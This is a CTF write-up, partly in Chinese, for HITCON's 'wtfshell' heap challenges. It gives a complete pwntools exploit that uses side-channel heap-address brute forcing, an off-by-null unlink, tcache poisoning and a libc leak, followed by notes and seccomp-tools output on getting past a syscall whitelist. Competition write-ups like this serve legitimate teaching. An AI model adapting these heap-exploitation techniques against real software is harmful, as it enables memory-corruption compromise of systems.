
```python
def debug(point):

if point == 0:

gdb.attach(r)

else:

gdb.attach(r,"b "+point)

r = process('/mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell')

def menu(payload):

r.recvuntil("√")

r.sendline(payload)

def add\_data(name,content):

payload = b'rip.'+name

menu(payload)

sleep(0.1)

r.send(content)

def new\_file(name,flag):

payload = b'nsfw,'+name+b','+flag

menu(payload)

def show\_file(name):

payload = b'omfg,'+name

menu(payload)

def recover\_data(name,content):

payload = b'wtf,'+content+b','+name

menu(payload)

def delete\_file(name):

payload = b'gtfo,'+name

menu(payload)

def add\_user(name):

payload = b'stfu,'+name

menu(payload)

def edit\_pwd(name,pwd):

payload = b'asap,'+name

menu(payload)

r.recvuntil(b"password:")

r.send(pwd)

r.recvuntil(b"retype password:")

r.send(pwd)

def delete\_all():

payload = b'irl.'

menu(payload)

def burp(name,pwd):

addr = "\x80"

for i in range(0x6):

log.success("addr: "+hex(u64(addr.ljust(0x8,'\0'))))

for j in range(0xb,0xff):

payload = b'asap,'+name

menu(payload)

r.recvuntil(b"password:")

r.send(pwd)

r.recvuntil(b"retype password:")

r.send(pwd+addr+chr(j)+"\n")

data=r.recvuntil("\n",timeout=0.1)

if b"asap: " not in data:

addr+=chr(j)

r.send(b'\x00\n')

break

else:

continue

return u64(addr.ljust(0x8,'\0'))

def write\_addr(filename,payload,size):

whole\_size = len(payload)+1

no\_null\_payload = payload.replace(b'\x00',b'a')

for i in range(size):

# log.success(hex(i))

if no\_null\_payload[whole\_size-i-2:whole\_size-i-1] == b'a':

# pause()

recover\_data(filename,no\_null\_payload[0:whole\_size-i-2])

# debug("free")

else:

continue

add\_user(b'what')

add\_user(b'lotus')

heap\_base=burp(b'lotus',"a"\*0x40)-0x880

key = heap\_base>>12

# for i in range(0x7):

# new\_file(b'chunk1',b'3')

# add\_data(b'chunk1')

new\_file(b'big',b'3')

new\_file(b'gbuff',b'3')

new\_file(b'off-by-null-chunk',b'3')

for i in range(0x7):

new\_file(b"chunk"+str(i).encode(),b'3')

new\_file(b"chunk1"+str(i).encode(),b'3')

new\_file(b'chunk21',b'3')

new\_file(b'chunk22',b'3')

for i in range(0x7):

for j in range(0x4):

add\_data(b"chunk"+str(i).encode(),b'a'\*0x100)

for i in range(0x2):

for j in range(0x2):

add\_data(b"chunk1"+str(i).encode(),b'a'\*0x100)

add\_data(b"chunk1"+str(i).encode(),b'a'\*0xf0+b'\n')

for i in range(0x3):

recover\_data(b"chunk2"+str(i).encode(),b'a'\*0x20)

for i in range(3,7):

for j in range(0x2):

add\_data(b"chunk1"+str(i).encode(),b'a'\*0x100)

add\_data(b"chunk1"+str(i).encode(),b'a'\*0xf0+b'\n')

[add\_data(b'big',p16(0x1650)+b'/'\*(0x100-2)) for i in range(0x10)]

add\_data(b'big',b'a'\*0x10+b'\n')

new\_file(b'b'\*0x100,b'3')#use to get the free 0x110 tcache and add a chunk between the unsortedbin and the top chunk

add\_data(b'big',b'a'\*0x100)# free the unsortedbin

#add 0x408 back

[add\_data(b'gbuff',b'a'\*0x100) for i in range(0x3)]

add\_data(b'gbuff',b'a'\*0xf8+b'\n')

#add 0x521 chunk to off-by-null

[add\_data(b'off-by-null-chunk',b'a'\*0x100) for i in range(0x5)]

add\_data(b'off-by-null-chunk',b'a'\*0x10+b'\n')

[delete\_file(b"chunk"+str(i).encode()) for i in range(0x6)]

add\_data(b'gbuff',b'a'\*0x100)

delete\_all()

new\_file(b'useless\_chunk',b'3')

[add\_data(b'useless\_chunk',b'a'\*0x100) for i in range(0x3)]

add\_data(b'useless\_chunk',b'a'\*0x10+b'\n')

# add a 0x321 chunk and edit its fake\_next\_size

new\_file(b'off-by-null-chunk',b'3')

[add\_data(b'off-by-null-chunk',b'\x31'\*0x100) for i in range(0x3)]

add\_data(b'off-by-null-chunk',b'\x31'\*0x10+b'\n')

[recover\_data(b'off-by-null-chunk',b'\x31'\*(0x2ff-i)) for i in range(0x6)]

recover\_data(b'off-by-null-chunk',b'\x31'\*(0x2ff-6)+b'\x09')

menu(b'rip.'+b'a'\*(0x400-4))#make off by null and clear the prev\_size

for i in range(0x9):

new\_file(b"chunk1"+str(i).encode(),b'3')

for i in range(0x9):

recover\_data(b"chunk1"+str(i).encode(),b'i'\*0x2f0)

fake\_point = heap\_base+0x2af0

fake\_point\_addr = fake\_point+0x30

fake\_unlink\_chunk = b'i'\*0x10+p64(0)+p64(0x1651)+p64(fake\_point\_addr-0x18)+p64(fake\_point\_addr-0x10)+p64(fake\_point\_addr-0x20)+p64(fake\_point\_addr-0x18)+p64(fake\_point)\*2

write\_addr(b'chunk15',fake\_unlink\_chunk,len(fake\_unlink\_chunk)-0x10)

[delete\_file(b"chunk1"+str(i).encode()) for i in range(0x4)]

delete\_file(b'chunk17')

delete\_file(b'chunk18')

delete\_file(b'chunk16')

#off by null unlink

delete\_file(b'off-by-null-chunk')

#clear the tcache list 0x20

for i in range(0xa):

new\_file(b'useless'+str(i).encode(),b'3')

recover\_data(b'useless'+str(i).encode(),b'a'\*8)

new\_file(b'a'\*0x2e0,b'3')

new\_file(b'b'\*0x2d0,b'3')

#leak\_libc\_base

show\_file(b'chunk14')

libc\_base = u64(r.recvuntil(b'\x7f')[-6:].ljust(0x8,b'\0'))-0x1f6cc0

new\_file(b'a'\*0x220,b'3')

new\_file(b'edit\_tcache\_next',b'3')

recover\_data(b'edit\_tcache\_next',b'a'\*0x220)

write\_addr(b'edit\_tcache\_next',b'a'\*192+p64((heap\_base+0x330)^(key+3)),0x8)

new\_file(b'a'\*0x20,b'3')

new\_file(b'go\_attack',b'3')

recover\_data(b'go\_attack',b'a'\*0x20)

write\_addr(b'go\_attack',p32(1)+p32(0x3)+p64(0xdeadbeef)+b'lotuslotus',0x1a)

show\_file(b'a'\*0x10)

# debug("malloc\_printerr")

qwq(heap\_base)

qwq(libc\_base)

r.interactive()
```

ps：exp运行一次可能不能成功，侧信道爆破以及`write_addr`似乎有某些bug，不过多运行几次就能通。

## wtfshell2

wtfshell2只用考虑如何绕过沙盒，并且劫持程序流即可。

劫持`strtok`的libc-got表为`magic_gadget`，然后可劫持程序流。

沙盒是白名单，没有open。沙盒绕过卡掉了一个解，`wtfshell2`比`wtfshell1`少了一个解。`wtfshell2`相比与`wtfshell1`就是多了沙盒。因为我们在`wtfshell1`中已经拿到了任意地址写，和`heap_base`、`libc_base`，`wtfshell2`考察的就是如何绕过沙箱写`orw`：

```shell
zb@ubuntu:~/seccomp-tools$ seccomp-tools dump /mnt/hgfs/ubuntu/hitcon/heap/share/wtfshell

line CODE JT JF K
=================================
0000: 0x20 0x00 0x00 0x00000000 A = sys_number
0001: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0006
0002: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)
0003: 0x15 0x00 0x01 0x00000000 if (A != 0x0) goto 0005
0004: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0005: 0x06 0x00 0x00 0x00000000 return KILL
0006: 0x20 0x00 0x00 0x00000000 A = sys_number
0007: 0x15 0x00 0x01 0x00000003 if (A != close) goto 0009
0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0009: 0x20 0x00 0x00 0x00000000 A = sys_number
0010: 0x15 0x00 0x06 0x00000009 if (A != mmap) goto 0017
0011: 0x20 0x00 0x00 0x00000020 A = prot # mmap(addr, len, prot, flags, fd, pgoff)
0012: 0x15 0x03 0x00 0x00000007 if (A == 0x7) goto 0016
0013: 0x20 0x00 0x00 0x00000030 A = fd # mmap(addr, len, prot, flags, fd, pgoff)
0014: 0x15 0x00 0x01 0xffffffff if (A != 0xffffffff) goto 0016
0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0016: 0x06 0x00 0x00 0x00000000 return KILL
0017: 0x20 0x00 0x00 0x00000000 A = sys_number
0018: 0x15 0x00 0x01 0x0000000b if (A != munmap) goto 0020
0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0020: 0x20 0x00 0x00 0x00000000 A = sys_number
0021: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0023
0022: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0023: 0x20 0x00 0x00 0x00000000 A = sys_number
0024: 0x15 0x00 0x01 0x00000027 if (A != getpid) goto 0026
0025: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0026: 0x20 0x00 0x00 0x00000000 A = sys_number
0027: 0x15 0x00 0x01 0x00000066 if (A != getuid) goto 0029
0028: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0029: 0x20 0x00 0x00 0x00000000 A = sys_number
0030: 0x15 0x00 0x01 0x00000068 if (A != getgid) goto 0032
0031: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0032: 0x20 0x00 0x00 0x00000000 A = sys_number
0033: 0x15 0x00 0x04 0x00000014 if (A != writev) goto 0038
0034: 0x20 0x00 0x00 0x00000010 A = fd # writev(fd, vec, vlen)
0035: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0037
0036: 0x06 0x00 0x00 0x7fff0000 return ALLOW
0037: 0x06 0x00 0x00 0x00000000 return KILL
0038: 0x20 0x00 0x00 0x00000000 A = sys_number
0039: 0x15 0x00 0x05 0x0000003c if (A != exit) goto 0045
0040: 0x20 0x00 0x00 0x00000010 A = error_code # exit(error_code)
```
